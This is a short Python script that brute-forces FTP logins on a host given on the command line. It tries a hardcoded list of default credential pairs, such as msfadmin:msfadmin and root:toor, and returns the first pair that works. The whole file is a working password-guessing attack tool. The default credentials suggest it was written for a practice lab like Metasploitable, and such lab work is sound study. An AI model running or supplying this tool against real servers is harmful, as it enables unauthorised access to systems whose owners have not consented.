
import ftplib
import argparse
# program to brute force the host 

def brute(host):
    pf=[ 'user:pass','msfadmin:msfadmin','root:toor','root:9878']
    for line in pf:
        user=line.split(':')[0]
        pas=line.split(':')[1].strip('\r').strip('\n')
        print('trying for  ' +user+ ' with ' +pas)
        try:
            ftp=ftplib.FTP(host)
            ftp.login(user,pas)
            print("success")
           # ftp.quit()
            return(user,pas)
        except Exception as e:
            print(str(e))
            print('bruteforcing failed ')


def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('-H','--host',action='store',dest='host',help='specify the host ip ')
    #parser.add_argument('-f','--file',action='store',dest='file',help='spcify the file')
    args=parser.parse_args()
    host=args.host
   # file=args.file
    if host==None : #or file==None :
        print('specify the host and file')
    else:
        brute(host)

if __name__=='__main__':
    main()
